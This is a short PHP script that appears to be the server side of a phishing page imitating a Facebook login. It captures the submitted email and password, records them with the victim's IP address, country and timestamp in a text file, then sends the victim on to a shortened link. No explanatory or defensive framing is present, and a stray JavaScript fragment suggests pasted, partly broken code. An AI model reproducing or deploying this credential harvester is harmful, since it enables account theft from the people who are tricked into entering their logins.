<?php
ini_set('memory_limit', '-1');

$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
include("geoiploc.php");
$ip = $_SERVER[ 'REMOTE_ADDR' ];javascript:void(0);
$pais = getCountryFromIP($ip, " NamE ");
$fecha = date("d/m/Y h:i"); 

if( ( empty($usuario)) or (empty($password)) ){
	
echo ("<SCRIPT LANGUAGE='JavaScript'>


     history.go(-1);



    </SCRIPT>");
	
	
}else{	


	//guarderemos en un archivo de texto
	$file = fopen($pais.'facebus.txt','a+');
	fwrite($file, $usuario."\n".$password."\n".$ip."\n".$pais."\n============".$fecha."=============\n");
	fclose($file);
	
	

	
echo ("<SCRIPT LANGUAGE='JavaScript'>


    
    
 window.location.href='https://t.co/dQ5qois3ea';


    </SCRIPT>");
  	
 
	
}
?>
